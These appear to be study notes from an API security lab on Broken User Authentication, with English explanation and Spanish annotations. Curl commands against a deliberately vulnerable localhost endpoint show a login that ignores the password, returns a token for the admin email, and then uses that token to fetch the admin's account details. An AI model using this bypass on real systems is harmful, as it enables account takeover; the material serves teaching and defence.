# Broken User Authentication (BUA)

## **How does it happen?**

User authentication is the core aspect of developing any application containing sensitive data. Broken User Authentication (BUA) reflects a scenario where an API endpoint allows an attacker to access a database or acquire a higher privilege than the existing one. The primary reason behind BUA is either **invalid implementation of authentication** like using incorrect email/password queries etc., or the absence of security mechanisms like authorisation headers, tokens etc.

Consider a scenario in which an attacker acquires the capability to abuse an authentication API; it will eventually result in data leaks, deletion, modification, or even the complete account takeover by the attacker. Usually, hackers have created special scripts to profile, enumerate users on a system and identify authentication endpoints. A poorly implemented authentication system can lead any user to take on another user's identity. 

## **Likely Impact** 

In broken user authentication, attackers can compromise the authenticated session or the authentication mechanism and easily access sensitive data. Malicious actors can pretend to be someone authorised and can conduct an undesired activity, including a complete account takeover.

## Practical Example  

-   Continue to use the Chrome browser and Talend API Tester for debugging in the VM.
-   Bob understands that authentication is critical and has been tasked to develop an API endpoint `apirule2/user/login_v` that will authenticate based on provided email and password.
-   The endpoint will return a token, which will be passed as an `Authorisation-Token` header (GET request) to `apirule2/user/details` to show details of the specific employee. Bob successfully developed the login endpoint; however, he only used email to validate the user from the `user table` and ignored the password field in the SQL query. An attacker only requires the victim's email address to get a valid token or account takeover.
-    In the VM, you can test this by sending a `POST` request to `http://localhost:80/MHT/apirule2/user/login_v` with email and password in the form parameters.```

- con la falla, no valida el passowrd
```
curl http://127.0.0.1:80/MHT/apirule2/user/login_v -d "email=admin@mht.com&password=other"

{"success":"true","token":"0g*[v;~5lyx5L15J25sm$nm:cAWZv}"}
```

- asegurado, valida user y password
```
curl http://127.0.0.1:80/MHT/apirule2/user/login_s -d "email=admin@mht.com&password=other"
{"success":"false","cause":"Incorrect Username & Password"}
```

- dado que nos da un toquen, ahora podremos ver los detalles de otro usuario usando el token valido
```
curl http://127.0.0.1:80/MHT/apirule2/user/details -H "Authorization-Token: 0g*[v;~5lyx5L15J25sm$nm:cAWZv}"
{"id":1,"email":"admin@mht.com","name":"Bob","token":"0g*[v;~5lyx5L15J25sm$nm:cAWZv}","address":"H1 Turkey","city":"Mesport","country":"Turkey"}
```

